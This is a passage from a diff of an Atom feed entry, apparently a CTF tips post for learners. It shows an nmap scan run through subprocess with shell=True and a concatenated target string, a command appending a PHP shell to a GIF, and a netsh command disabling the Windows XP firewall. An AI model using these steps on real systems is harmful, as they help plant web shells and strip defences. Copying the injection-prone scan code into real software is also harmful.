-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Scanning for open ports using nmap&amp;quot;&lt;/span&gt;
-&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;nmap -sS -sV -T4 -p 22-2048 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;base_URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[*] Scanning for open ports using nmap&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nmap -sS -sV -T4 -p 22-2048 &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;base_URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;tee&lt;/strong&gt; is nice to store and view the output of another command. It can be very useful with &lt;em&gt;curl&lt;/em&gt;. A simple  example:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls &lt;span class="p"&gt;|&lt;/span&gt; tee file
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls | tee file
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -209,7 +207,7 @@ $ xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e
 &lt;p&gt;&lt;strong&gt;md5 hashing&lt;/strong&gt; is used all the time:&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;echo&lt;/span&gt; -n password &lt;span class="p"&gt;|&lt;/span&gt; md5sum
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -n password | md5sum
 5f4dcc3b5aa765d61d8327deb882cf99
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -217,16 +215,16 @@ $ xxd -r -p &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; 2f722f6e
 &lt;ul&gt;
 &lt;li&gt;You might want to &lt;strong&gt;append a shell code to an image&lt;/strong&gt; (for example, a GIF file):&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat PHP-shell.php &amp;gt;&amp;gt; fig.gif
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat PHP-shell.php &amp;gt;&amp;gt; fig.gif
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Now a special one: Windows! One of the trivia questions in this CTF. How to disable the Windows XP Firewall from command line:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;netsh firewall &lt;span class="nb"&gt;set&lt;/span&gt; opmode &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;DISABLE.
+&lt;div class="highlight"&gt;&lt;pre&gt;netsh firewall &lt;span class="nb"&gt;set &lt;/span&gt;opmode &lt;span class="nv"&gt;mode&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;DISABLE.
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;That's it. Hack all the things!&lt;/strong&gt;&lt;/p&gt;</content><category term="Linux"></category><category term="RFI"></category><category term="SQL_injection"></category><category term="LFI"></category><category term="RCE"></category><category term="PHP"></category><category term="CMS"></category><category term="ApPHP"></category><category term="unoconv"></category><category term="ColdFusion"></category><category term="Buffer_Overflow"></category><category term="Steganography"></category><category term="Wireshark"></category><category term="ExifTool"></category><category term="netsh"></category><category term="CTF"></category><category term="scapy"></category><category term="RIPS"></category><category term="Heartbleed"></category><category term="nmap"></category></entry></feed>
+&lt;hr /&gt;
+&lt;p&gt;&lt;strong&gt;That's it. Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="Linux"></category><category term="RFI"></category><category term="SQL_injection"></category><category term="LFI"></category><category term="RCE"></category><category term="PHP"></category><category term="CMS"></category><category term="ApPHP"></category><category term="unoconv"></category><category term="ColdFusion"></category><category term="Buffer_Overflow"></category><category term="Steganography"></category><category term="Wireshark"></category><category term="ExifTool"></category><category term="netsh"></category><category term="CTF"></category><category term="scapy"></category><category term="RIPS"></category><category term="Heartbleed"></category><category term="nmap"></category></entry></feed>
